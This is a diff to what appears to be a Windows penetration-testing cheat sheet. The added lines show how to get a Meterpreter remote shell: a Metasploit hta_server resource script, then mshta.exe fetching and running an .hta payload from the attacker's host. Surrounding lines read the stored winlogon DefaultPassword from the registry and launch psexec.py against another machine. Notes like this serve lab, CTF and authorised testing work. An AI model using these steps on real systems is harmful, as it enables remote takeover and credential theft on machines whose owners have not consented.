@@ -21,7 +21,22 @@ All the functions can be seen in github.
 
 >reg query 'HKLM\Software\Microsoft\Windows NT\Currentversion\winlogon' /v DefaultPassword
 
+Connect meterpreter shell from cmd
+----------------------------------
 >runas.exe /user:administrator cmd (run with cmd)
+
+Creter a meterpreter script with hta_server (script.rc) 
+
+use exploit/windows/misc/hta_server
+set LHOSTS 10.10.21.2
+set LPORT 2222
+exploit
+
+#msfconsole -r ./script.rc
+
+Copy the URL > http://10.10.21.2:8080/rKKsNNLXE2Tfmi.hta
+Run with mshta.exe in cmd > mshta.exe http://10.10.21.2:8080/rKKsNNLXE2Tfmi.hta
+
 
 #psexec.py administrator@10.0.20.64
 
